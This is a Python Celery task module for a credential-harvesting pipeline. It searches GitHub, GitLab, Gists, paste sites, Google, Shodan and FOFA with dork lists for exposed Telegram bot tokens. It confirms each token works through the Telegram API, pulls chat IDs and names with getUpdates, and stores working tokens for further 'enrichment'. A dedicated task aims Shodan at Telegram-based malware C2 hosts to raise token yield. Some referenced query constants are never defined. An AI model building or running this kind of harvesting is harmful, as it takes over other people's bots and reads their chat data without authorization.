import asyncio  # Ensure asyncio is imported
import hashlib
import logging
import random
import time

from app.core.config import settings
from app.core.constants import MAX_ERRORS_BUFFER
from app.core.database import db
from app.core.security import security
from app.services.scanners import (
    FofaService,
    GithubService,
    GitlabService,
    GrepAppService,
    PastebinService,
    SerperService,
    ShodanService,
    UrlScanService,
)
from app.services.scanners_extension import (
    GoogleSearchService,
    BitbucketService,
    NetlasService,
    GithubGistService,   # BUG-001: was incorrectly imported from scanners.py
    PublicWwwService,    # BUG-002: needed for publicwww_srv instantiation
)
from app.workers.celery_app import app
from app.workers.tasks.flow_tasks import (  # Import for triggering and DB
    async_execute,
    enrich_credential,
    redis_client,  # Shared module-level pool — avoids per-call ConnectionPool allocation
)

# Configure Task Logger
logger = logging.getLogger("scanner.tasks")
logger.setLevel(logging.INFO)

# Instantiate services
shodan = ShodanService()
github = GithubService()
urlscan = UrlScanService()
fofa = FofaService()

gitlab_srv = GitlabService()
bitbucket_srv = BitbucketService()
gist_srv = GithubGistService()
grepapp_srv = GrepAppService()
pastebin_srv = PastebinService()
serper_srv = SerperService()
google_srv = GoogleSearchService()
netlas_srv = NetlasService()
publicwww_srv = PublicWwwService()  # BUG-002: was missing, caused NameError in scan_publicwww


def _calculate_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()


async def _save_credentials_async(results, source_name: str):
    """
    Validates token format and checks if bot is active via Telegram Bot API.
    Saves if token passes format check AND getMe - does NOT require chats.
    """
    import httpx

    from app.services.scanners import _is_valid_token

    saved_count = 0
    logger.info(f"🔍 [Batch] Validating {len(results)} potential credentials from {source_name}...")

    # Use Async Client for validation
    async with httpx.AsyncClient(timeout=10.0) as client:
        for item in results:
            token = item.get("token")
            if not token or token == "MANUAL_REVIEW_REQUIRED":
                continue

            # Step 1: Validate token format (reject Fernet/hashes)
            if not _is_valid_token(token):
                logger.debug(f"    ❌ [Validate] Invalid format: {token[:15]}...")
                continue

            token_hash = _calculate_hash(token)
            existing_id = None
            existing_has_chat = False

            # Check if the result already has a chat_id (From URL/DeepScan extraction)
            extracted_chat_id = item.get("chat_id")

            try:
                # Step 2: Check if already exists (Using async_execute)
                existing = await async_execute(
                    db.table("discovered_credentials")
                    .select("id, chat_id")
                    .eq("token_hash", token_hash)
                )
                if existing.data:
                    existing_id = existing.data[0]["id"]
                    existing_has_chat = existing.data[0].get("chat_id") is not None
                    if existing_has_chat:
                        logger.debug(
                            f"    ⏭️ [Validate] Token {token[:10]}... already exists with chat_id."
                        )
                        continue  # Skip - already has chat_id
                    logger.info(
                        f"    🔄 [Validate] Token exists (ID: {existing_id}) but missing chat_id. Checking for updates..."
                    )

                # Step 3: Validate token with Telegram getMe API (NO CHAT REQUIRED)
                # Adding localized retry for Telegram API flakes
                base_url = f"https://api.telegram.org/bot{token}"
                me_data = None
                me_res = None

                for attempt in range(2):
                    try:
                        me_res = await client.get(f"{base_url}/getMe")
                        me_data = me_res.json()
                        if me_res.status_code == 200 and me_data.get("ok"):
                            break
                    except Exception:
                        if attempt == 0:
                            await asyncio.sleep(1)
                        continue

                if not me_res or me_res.status_code != 200 or not me_data.get("ok"):
                    logger.debug(
                        f"    ❌ [Validate] Token invalid or revoked (HTTP {me_res.status_code if me_res else 'timeout'})"
                    )
                    continue

                bot_info = me_data.get("result", {})
                bot_username = bot_info.get("username", "unknown")
                logger.info(
                    f"    ✅ [Validate] Token VALID! Bot: @{bot_username} (ID: {bot_info.get('id')})"
                )

                # Step 4: Try to get a chat_id (Priority: Extracted -> API -> None)
                chat_id = extracted_chat_id
                chat_name = None
                chat_type = None

                if chat_id:
                    logger.info(f"    📍 [Validate] Using extracted chat_id: {chat_id}")
                else:
                    # Try to fetch via API if we didn't extract one
                    try:
                        updates_res = await client.get(
                            f"{base_url}/getUpdates", params={"limit": 10}
                        )
                        if updates_res.status_code == 200 and updates_res.json().get("ok"):
                            updates = updates_res.json().get("result", [])
                            for update in updates:
                                for key in ["message", "channel_post", "my_chat_member"]:
                                    if key in update and update[key].get("chat"):
                                        chat = update[key]["chat"]
                                        chat_id = chat.get("id")
                                        chat_name = (
                                            chat.get("title")
                                            or chat.get("username")
                                            or chat.get("first_name")
                                        )
                                        chat_type = chat.get("type")
                                        break
                                if chat_id:
                                    logger.info(
                                        f"    🕵️ [Validate] Discovered chat_id via getUpdates: {chat_name} ({chat_id})"
                                    )
                                    break
                    except Exception as e:
                        logger.warning(f"    ⚠️ [Validate] getUpdates check failed: {e}")

                # Step 5: Save to DB (INSERT new or UPDATE existing if we have chat_id)

                if existing_id and chat_id:
                    # UPDATE existing record with new chat_id
                    update_data = {
                        "chat_id": chat_id,
                        "status": "active",
                        "meta": {
                            **item.get("meta", {}),
                            **existing.data[0].get("meta", {}),
                            "last_seen_source": source_name,
                            "last_verified_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
                        },
                    }
                    if chat_name:
                        update_data["chat_name"] = chat_name
                    if chat_type:
                        update_data["chat_type"] = chat_type

                    await async_execute(
                        db.table("discovered_credentials").update(update_data).eq("id", existing_id)
                    )
                    logger.info(
                        f"    🆙 [Batch] Updated existing record {existing_id} with chat_id {chat_id}"
                    )
                    saved_count += 1

                elif existing_id and not chat_id:
                    # BUG-010: Gate re-queue with Redis cooldown to prevent unbounded task flooding
                    from app.core.redis_srv import redis_srv
                    cooldown_key = f"enrich_requeue:{existing_id}"
                    if not redis_srv.is_on_cooldown(cooldown_key):
                        enrich_credential.delay(existing_id)
                        redis_srv.set_cooldown(cooldown_key, 3600)  # 1-hour cooldown per credential

                elif not existing_id:
                    # INSERT new record
                    new_data = {
                        "bot_token": security.encrypt(token),
                        "token_hash": token_hash,
                        "chat_id": chat_id,
                        "chat_name": chat_name,
                        "chat_type": chat_type,
                        "bot_id": str(bot_info.get("id")),
                        "bot_username": bot_username,
                        "source": source_name,
                        "status": "pending" if not chat_id else "active",
                        "meta": {
                            **item.get("meta", {}),
                            "bot_username": bot_username,
                            "bot_id": bot_info.get("id"),
                            "chat_name": chat_name,
                            "chat_type": chat_type,
                        },
                    }

                    res = await async_execute(db.table("discovered_credentials").insert(new_data))

                    if res.data:
                        new_id = res.data[0]["id"]
                        status_label = "✅ ACTIVE" if chat_id else "⏳ PENDING"

                        from app.workers.tasks.flow_tasks import get_broadcaster
                        await get_broadcaster().send_log(
                            f"🎯 [{source_name}] **New Bot Token!**\n"
                            f"Bot: @{bot_username}\n"
                            f"ID: `{new_id}`\n"
                            f"Status: {status_label}"
                        )
                        saved_count += 1

                        # TRIGGER ENRICHMENT for new credentials
                        enrich_credential.delay(new_id)

            except Exception as e:
                logger.error(f"    ❌ [Validate] Error processing token: {str(e)}")
                pass

    logger.info(f"✅ [Batch] Finished. Saved/Updated {saved_count} credentials.")
    return saved_count


def _run_sync(coro):
    """Helper to run async code in sync Celery task using persistent worker loop (BUG-008)."""
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(coro)


def _save_credentials(results, source_name: str):
    return _run_sync(_save_credentials_async(results, source_name))


async def _send_log_async(message: str):
    from app.workers.tasks.flow_tasks import get_broadcaster
    broadcaster = get_broadcaster()
    await broadcaster.send_log(message)


# ==========================================
# TASKS
# ==========================================


@app.task(name="scanner.scan_shodan")
def scan_shodan(query: str = None, country_code: str = None):
    return _run_sync(_scan_shodan_async(query, country_code))


async def _scan_shodan_async(query: str = None, country_code: str = None):
    default_queries = SHODAN_DEFAULT_QUERIES

    queries = [query] if query else default_queries

    selected_country = country_code
    if country_code == "RANDOM":
        selected_country = random.choice(settings.TARGET_COUNTRIES)

    logger.info(
        f"🌎 [Shodan] Starting Scan | Queries: {len(queries)} | Country: {selected_country or 'Global'}"
    )

    # Check Pause State
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [Shodan] System is PAUSED. Skipping scan.")
        return "System Paused"

    await _send_log_async(
        f"🌎 [Shodan] Starting scan with {len(queries)} queries (Country: {selected_country})..."
    )

    total_saved = 0
    errors = []
    result_msg = ""

    for q in queries:
        try:
            logger.info(f"    🔎 [Shodan] Executing query: {q}")
            # AWAIT the async search
            results = await shodan.search(q, country_code=selected_country)
            logger.info(f"    ✅ [Shodan] Query returned {len(results)} raw results.")

            # AWAIT the async save
            saved = await _save_credentials_async(results, "shodan")
            total_saved += saved

            await asyncio.sleep(1)  # Rate limit respect
        except Exception as e:
            logger.error(f"    ❌ [Shodan] Query failed: {str(e)}")
            errors.append(str(e))
            errors = errors[-MAX_ERRORS_BUFFER:]
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        await _send_log_async(f"❌ [Shodan] Completed with errors: {errors[0]}...")

    logger.info(f"🏁 [Shodan] Finished | Total Saved: {total_saved} | Errors: {len(errors)}")
    await _send_log_async(f"🏁 [Shodan] Finished. Saved {total_saved} new credentials.")
    return result_msg


@app.task(name="scanner.scan_urlscan")
def scan_urlscan(query: str = None, country_code: str = None):
    return _run_sync(_scan_urlscan_async(query, country_code))


async def _scan_urlscan_async(query: str = None, country_code: str = None):

    COMMON_QUERIES = [
        "api.telegram.org/bot",
        "bot_token",
        "TELEGRAM_BOT_TOKEN",
        "TELEGRAM_TOKEN",
        "Telegram Bot",
        "https://api.telegram.org",
    ]

    queries = [query] if query else COMMON_QUERIES

    selected_country = country_code
    if country_code == "RANDOM":
        selected_country = random.choice(settings.TARGET_COUNTRIES)

    logger.info(
        f"🔍 [URLScan] Starting Scan | Queries: {len(queries)} | Country: {selected_country or 'Global'}"
    )

    # Check Pause State
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [URLScan] System is PAUSED. Skipping scan.")
        return "System Paused"

    await _send_log_async(
        f"🔍 [URLScan] Starting scan with {len(queries)} queries (Country: {selected_country})"
    )

    total_saved = 0
    errors = []

    for q in queries:
        try:
            logger.info(f"    🔎 [URLScan] Query: {q}")
            results = await urlscan.search(q, country_code=selected_country)
            logger.info(f"    ✅ [URLScan] Returned {len(results)} results.")

            saved = await _save_credentials_async(results, "urlscan")
            total_saved += saved
            await asyncio.sleep(2)  # Rate limit protection
        except Exception as e:
            logger.error(f"    ❌ [URLScan] Query failed: {e}")
            errors.append(str(e))
            errors = errors[-MAX_ERRORS_BUFFER:]

    result_msg = f"URLScan scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"

    logger.info(f"🏁 [URLScan] Finished | Saved: {total_saved} | Errors: {len(errors)}")
    await _send_log_async(f"🏁 [URLScan] Finished. Saved {total_saved} new credentials.")
    return result_msg


@app.task(name="scanner.scan_github")
def scan_github(query: str = None):
    return _run_sync(_scan_github_async(query))


async def _scan_github_async(query: str = None):
    default_dorks = [
        # .env files with real token patterns (most productive)
        'filename:.env "TELEGRAM_BOT_TOKEN"',
        'filename:.env "TG_BOT_TOKEN"',
        'filename:.env "BOT_TOKEN"',
        'filename:.env "TELEGRAM_TOKEN"',
        'filename:.env "api.telegram.org"',
        # Config files
        'filename:config.json "bot_token"',
        'filename:config.py "bot_token"',
        'filename:settings.py "TELEGRAM_TOKEN"',
        'filename:config.yaml "telegram_token"',
        'filename:config.toml "telegram_token"',
        'filename:docker-compose.yml "TELEGRAM_BOT_TOKEN"',
        'filename:.env.local "TELEGRAM"',
        'filename:.env.production "TELEGRAM"',
        # Direct token pattern in source — most likely to be real
        '"api.telegram.org/bot" extension:py',
        '"api.telegram.org/bot" extension:js',
        '"api.telegram.org/bot" extension:php',
        '"api.telegram.org/bot" extension:go',
        '"api.telegram.org/bot" extension:rb',
        # Library-specific patterns
        'language:python "ApplicationBuilder" "token"',
        'language:javascript "new TelegramBot" "token"',
        'language:php "TelegramBot" "api_key"',
        'language:go "NewBotAPI"',
        'language:python "Bot(" extension:py',
        # Exclude docs/examples to reduce noise
        '"https://api.telegram.org/bot" -filename:README.md -filename:*.md -filename:dataset',
    ]

    if query:
        queries = [query]
    else:
        queries = default_dorks

    total_saved = 0
    errors = []

    # Check Pause State
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [GitHub] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info(f"🐱 [GitHub] Starting scan with {len(queries)} dorks...")
    await _send_log_async(f"🐱 [GitHub] Starting scan with {len(queries)} dorks (Full sweep)...")

    for q in queries:
        logger.info(f"    🔎 [GitHub] Dorking: {q}")
        try:
            results = await github.search(q)
            logger.info(f"    ✅ [GitHub] Dork returned {len(results)} matches.")

            saved = await _save_credentials_async(results, "github")
            total_saved += saved

        except Exception as e:
            logger.error(f"    ❌ [GitHub] Dork failed: {str(e)}")
            errors.append(str(e))
            errors = errors[-MAX_ERRORS_BUFFER:]

        await asyncio.sleep(5)

    if errors:
        logger.warning(f"⚠️ [GitHub] Completed with {len(errors)} errors.")

    result_msg = f"GitHub scan finished. Saved {total_saved} unique credentials."
    if errors:
        result_msg += f" (Encountered {len(errors)} errors)"
    await _send_log_async(f"🏁 [GitHub] Finished. Saved {total_saved} unique credentials.")
    return result_msg


@app.task(
    name="scanner.scan_fofa",
    bind=True,
    autoretry_for=(Exception,),
    retry_backoff=True,
    retry_jitter=True,
    max_retries=3,
)
def scan_fofa(self, query: str = None, country_code: str = None):
    return _run_sync(_scan_fofa_async(self, query, country_code))


async def _scan_fofa_async(task_self, query: str = None, country_code: str = None):
    queries = [query] if query else FOFA_DEFAULT_QUERIES

    selected_country = country_code
    if country_code == "RANDOM":
        selected_country = random.choice(settings.TARGET_COUNTRIES)
        logger.info(f"    [FOFA] Randomly selected country: {selected_country}")

    logger.info(
        f"🔍 [FOFA] Starting Scan | Queries: {len(queries)} | Country: {selected_country or 'Global'}"
    )

    # Check Pause State
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [FOFA] System is PAUSED. Skipping scan.")
        return "System Paused"

    await _send_log_async(
        f"🔍 [FOFA] Starting scan with {len(queries)} queries (Country: {selected_country})..."
    )

    total_saved = 0
    errors = []

    for q in queries:
        try:
            logger.info(f"    🔎 [FOFA] Executing query: {q}")
            results = await fofa.search(query=q, country_code=selected_country)
            logger.info(f"    ✅ [FOFA] Query returned {len(results)} raw results.")

            saved = await _save_credentials_async(results, "fofa")
            total_saved += saved
            await asyncio.sleep(2)
        except Exception as e:
            logger.error(f"    ❌ [FOFA] Query failed: {str(e)}")
            errors.append(str(e))
            errors = errors[-MAX_ERRORS_BUFFER:]
            if task_self.request.retries < task_self.max_retries:
                # We can't use self.retry inside async without care?
                # Celery retry raises an exception.
                # Just log for now to avoid complexity in this async wrapper
                pass

    result_msg = f"FOFA scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        await _send_log_async(f"❌ [FOFA] Completed with errors: {errors[0]}...")
    else:
        await _send_log_async(f"🏁 [FOFA] Finished. Saved {total_saved} new credentials.")

    logger.info(f"🏁 [FOFA] Finished | Total Saved: {total_saved} | Errors: {len(errors)}")
    return result_msg


@app.task(name="scanner.scan_gitlab", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
def scan_gitlab(query: str = None):
    return _run_sync(_scan_gitlab_async(query))


async def _scan_gitlab_async(query: str = None):
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [GitLab] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info("🔍 [GitLab] Starting scan...")
    await _send_log_async("🔍 [GitLab] Starting scheduled scan...")

    total_saved = 0
    errors = []

    try:
        results = await gitlab_srv.search()
        logger.info(f"    ✅ [GitLab] Returned {len(results)} matches.")
        saved = await _save_credentials_async(results, "gitlab")
        total_saved += saved
    except Exception as e:
        logger.error(f"    ❌ [GitLab] Scan failed: {str(e)}")
        errors.append(str(e))

    result_msg = f"GitLab scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        await _send_log_async(f"❌ [GitLab] Completed with errors: {errors[0]}...")
    else:
        await _send_log_async(f"🏁 [GitLab] Finished. Saved {total_saved} new credentials.")

    return result_msg


@app.task(
    name="scanner.scan_bitbucket", autoretry_for=(Exception,), retry_backoff=True, max_retries=2
)
def scan_bitbucket(query: str = None):
    return _run_sync(_scan_bitbucket_async(query))


async def _scan_bitbucket_async(query: str = None):
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [Bitbucket] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info("🔍 [Bitbucket] Starting scan...")
    await _send_log_async("🔍 [Bitbucket] Starting scheduled scan...")

    total_saved = 0
    errors = []

    try:
        results = await bitbucket_srv.search()
        logger.info(f"    ✅ [Bitbucket] Returned {len(results)} matches.")
        saved = await _save_credentials_async(results, "bitbucket")
        total_saved += saved
    except Exception as e:
        logger.error(f"    ❌ [Bitbucket] Scan failed: {str(e)}")
        errors.append(str(e))

    result_msg = f"Bitbucket scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        await _send_log_async(f"❌ [Bitbucket] Completed with errors: {errors[0]}...")
    else:
        await _send_log_async(f"🏁 [Bitbucket] Finished. Saved {total_saved} new credentials.")

    return result_msg


@app.task(name="scanner.scan_gist", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
def scan_gist(query: str = None):
    return _run_sync(_scan_gist_async(query))


async def _scan_gist_async(query: str = None):
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [Gist] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info("🔍 [Gist] Starting scan...")
    await _send_log_async("🔍 [Gist] Starting scheduled scan...")

    total_saved = 0
    errors = []

    try:
        results = await gist_srv.search()
        logger.info(f"    ✅ [Gist] Returned {len(results)} matches.")
        saved = await _save_credentials_async(results, "gist")
        total_saved += saved
    except Exception as e:
        logger.error(f"    ❌ [Gist] Scan failed: {str(e)}")
        errors.append(str(e))

    result_msg = f"Gist scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        await _send_log_async(f"❌ [Gist] Completed with errors: {errors[0]}...")
    else:
        await _send_log_async(f"🏁 [Gist] Finished. Saved {total_saved} new credentials.")

    return result_msg


@app.task(
    name="scanner.scan_grepapp", autoretry_for=(Exception,), retry_backoff=True, max_retries=2
)
def scan_grepapp(query: str = None):
    return _run_sync(_scan_grepapp_async(query))


async def _scan_grepapp_async(query: str = None):
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [GrepApp] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info("🔍 [GrepApp] Starting scan...")
    await _send_log_async("🔍 [GrepApp] Starting scheduled scan...")

    total_saved = 0
    errors = []

    try:
        results = await grepapp_srv.search()
        logger.info(f"    ✅ [GrepApp] Returned {len(results)} matches.")
        saved = await _save_credentials_async(results, "grepapp")
        total_saved += saved
    except Exception as e:
        logger.error(f"    ❌ [GrepApp] Scan failed: {str(e)}")
        errors.append(str(e))

    result_msg = f"GrepApp scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        await _send_log_async(f"❌ [GrepApp] Completed with errors: {errors[0]}...")
    else:
        await _send_log_async(f"🏁 [GrepApp] Finished. Saved {total_saved} new credentials.")

    return result_msg


@app.task(
    name="scanner.scan_publicwww", autoretry_for=(Exception,), retry_backoff=True, max_retries=2
)
def scan_publicwww(query: str = None):
    return _run_sync(_scan_publicwww_async(query))


async def _scan_publicwww_async(query: str = None):
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [PublicWWW] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info("🔍 [PublicWWW] Starting scan...")
    await _send_log_async("🔍 [PublicWWW] Starting scheduled scan...")

    total_saved = 0
    errors = []

    try:
        results = await publicwww_srv.search()
        logger.info(f"    ✅ [PublicWWW] Returned {len(results)} matches.")
        saved = await _save_credentials_async(results, "publicwww")
        total_saved += saved
    except Exception as e:
        logger.error(f"    ❌ [PublicWWW] Scan failed: {str(e)}")
        errors.append(str(e))

    result_msg = f"PublicWWW scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        await _send_log_async(f"❌ [PublicWWW] Completed with errors: {errors[0]}...")
    else:
        await _send_log_async(f"🏁 [PublicWWW] Finished. Saved {total_saved} new credentials.")

    return result_msg


@app.task(
    name="scanner.scan_pastebin", autoretry_for=(Exception,), retry_backoff=True, max_retries=2
)
def scan_pastebin(query: str = None):
    return _run_sync(_scan_pastebin_async(query))


async def _scan_pastebin_async(query: str = None):
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [Pastebin] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info("🔍 [Pastebin] Starting scan...")
    await _send_log_async("🔍 [Pastebin] Starting scheduled scan...")

    total_saved = 0
    errors = []

    try:
        results = await pastebin_srv.search()
        logger.info(f"    ✅ [Pastebin] Returned {len(results)} matches.")
        saved = await _save_credentials_async(results, "pastebin")
        total_saved += saved
    except Exception as e:
        logger.error(f"    ❌ [Pastebin] Scan failed: {str(e)}")
        errors.append(str(e))

    result_msg = f"Pastebin scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        await _send_log_async(f"❌ [Pastebin] Completed with errors: {errors[0]}...")
    else:
        await _send_log_async(f"🏁 [Pastebin] Finished. Saved {total_saved} new credentials.")

    return result_msg


@app.task(name="scanner.scan_serper", autoretry_for=(Exception,), retry_backoff=True, max_retries=3)
def scan_serper(query: str = None):
    return _run_sync(_scan_serper_async(query))


async def _scan_serper_async(query: str = None):
    if redis_client.get("system:paused"):
        return "System Paused"

    # Default clones to sweep
    dorks = [
        'site:pastebin.com "api.telegram.org/bot"',
        'site:hastebin.com "api.telegram.org/bot"',
        'site:ghostbin.com "api.telegram.org/bot"',
        'site:rentry.co "api.telegram.org/bot"',
    ]
    if query:
        dorks = [query]

    logger.info(f"🔍 [Serper] Starting scan with {len(dorks)} dorks...")
    await _send_log_async(
        f"🔍 [Serper] Starting sweep across {len(dorks)} paste sites via Serper.dev..."
    )

    total_saved = 0
    for dork in dorks:
        try:
            results = await serper_srv.search(dork)
            saved = await _save_credentials_async(results, "serper_dev")
            total_saved += saved
        except Exception as e:
            logger.error(f"    ❌ [Serper] Failed on {dork}: {e}")

    await _send_log_async(f"🏁 [Serper] Finished. Saved {total_saved} new credentials.")
    return f"Serper scan finished. Saved {total_saved}."


@app.task(name="scanner.retry_cold")
def retry_cold():
    return _run_sync(_retry_cold_async())


async def _retry_cold_async():
    if redis_client.get("system:paused"):
        return "System Paused"

    from datetime import datetime, timedelta, timezone

    from app.workers.tasks.flow_tasks import async_execute, enrich_credential

    logger.info("🔄 [RetryCold] Starting retry for low-viability but valid tokens...")
    await _send_log_async("🔄 [RetryCold] Starting chat discovery retry for cold valid tokens...")

    threshold = datetime.now(timezone.utc) - timedelta(hours=6)
    threshold_str = threshold.strftime("%Y-%m-%dT%H:%M:%S")

    res = await async_execute(
        db.table("discovered_credentials")
        .select("id, retry_reason")
        .eq("meta->>retryable", "true")
        .filter("meta->>retry_reason", "in", '("low_viability","no_chat_evidence")')
        .lt("meta->>last_gate_at", threshold_str)
    )

    retried = 0
    for row in res.data:
        cred_id = row["id"]
        reason = row.get("retry_reason", "")
        try:
            logger.info(f"    🔁 [RetryCold] Retrying {cred_id} (reason: {reason})")
            await async_execute(
                db.table("discovered_credentials")
                .update(
                    {
                        "meta": {
                            "retryable": False,
                            "last_retry_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
                        }
                    }
                )
                .eq("id", cred_id)
            )
            enrich_credential.delay(cred_id)
            retried += 1
        except Exception as e:
            logger.error(f"    ❌ [RetryCold] Failed to retry {cred_id}: {e}")

    result_msg = f"RetryCold finished. Retried {retried} tokens."
    await _send_log_async(f"🏁 [RetryCold] Finished. Retried {retried} tokens.")
    return result_msg


@app.task(name="scanner.scan_google", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
def scan_google(query: str = None):
    return _run_sync(_scan_google_async(query))


async def _scan_google_async(query: str = None):
    if redis_client.get("system:paused"):
        return "System Paused"

    dorks = [
        'site:pastebin.com "api.telegram.org/bot"',
        'site:github.com "TELEGRAM_BOT_TOKEN" filetype:env',
        'site:gitlab.com "api.telegram.org/bot"',
        'site:hastebin.com "api.telegram.org/bot"',
        'site:rentry.co "api.telegram.org/bot"',
        '"api.telegram.org/bot" filetype:py',
        '"api.telegram.org/bot" filetype:js',
        '"api.telegram.org/bot" filetype:env',
    ]
    if query:
        dorks = [query]

    logger.info(f"🔍 [Google] Starting scan with {len(dorks)} dorks...")
    await _send_log_async(f"🔍 [Google] Starting scan with {len(dorks)} dorks...")

    total_saved = 0
    errors = []

    for dork in dorks:
        try:
            results = await google_srv.search(dork)
            logger.info(f"    ✅ [Google] Dork returned {len(results)} results.")
            saved = await _save_credentials_async(results, "google_dork")
            total_saved += saved
        except Exception as e:
            logger.error(f"    ❌ [Google] Dork failed: {e}")
            errors.append(str(e))
            errors = errors[-MAX_ERRORS_BUFFER:]
        await asyncio.sleep(2)

    result_msg = f"Google scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
    await _send_log_async(f"🏁 [Google] Finished. Saved {total_saved} new credentials.")
    return result_msg


@app.task(name="scanner.scan_shodan_c2", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
def scan_shodan_c2():
    """
    Dedicated Shodan scan targeting Telegram-based C2/RAT infrastructure.
    These are live infected hosts using Telegram as a command-and-control channel —
    highest token yield because the token is actively in use on a running server.
    """
    return _run_sync(_scan_shodan_c2_async())


async def _scan_shodan_c2_async():
    if redis_client.get("system:paused"):
        return "System Paused"

    # Each query is a focused slice of the compound C2 query.
    # Shodan doesn't support deeply nested OR/AND in a single query reliably,
    # so we split into targeted sub-queries and deduplicate results.
    C2_QUERIES = [
        # Header-based detection — most precise, server is actively serving bot API
        'http.headers:"X-Telegram-Bot-Api"',
        # Malware category keywords paired with Telegram bot pattern
        'http.body:"api.telegram.org/bot" http.body:"malware" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"rat" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"remote access" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"spyware" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"stealer" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"keylogger" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"c2 server" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"command and control" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"exploit" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"bypass" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"inject" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"persistence" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"privilege escalation" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        # /start command with payload patterns — bot is receiving C2 commands
        'http.body:"api.telegram.org/bot" http.body:"/start payload=" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"/start token=" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"/start cmd=" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"/start c2=" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"/start key=" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"/start id=" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"/start /bin/bash" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"/start /powershell" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"/start download" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"/start /exec" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"/start /run" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"/start /invoke" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"/start /script" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"/start http://" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
        'http.body:"api.telegram.org/bot" http.body:"/start https://" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    ]

    logger.info(f"🎯 [Shodan-C2] Starting C2 scan with {len(C2_QUERIES)} targeted queries...")
    await _send_log_async(f"🎯 [Shodan-C2] Starting Telegram C2 infrastructure scan ({len(C2_QUERIES)} queries)...")

    total_saved = 0
    errors = []

    for q in C2_QUERIES:
        if not q:
            continue
        try:
            logger.info(f"    🔎 [Shodan-C2] Query: {q[:80]}...")
            results = await shodan.search(q)
            logger.info(f"    ✅ [Shodan-C2] Returned {len(results)} results")
            saved = await _save_credentials_async(results, "shodan_c2")
            total_saved += saved
            await asyncio.sleep(2)
        except Exception as e:
            logger.error(f"    ❌ [Shodan-C2] Query failed: {e}")
            errors.append(str(e))
            errors = errors[-MAX_ERRORS_BUFFER:]

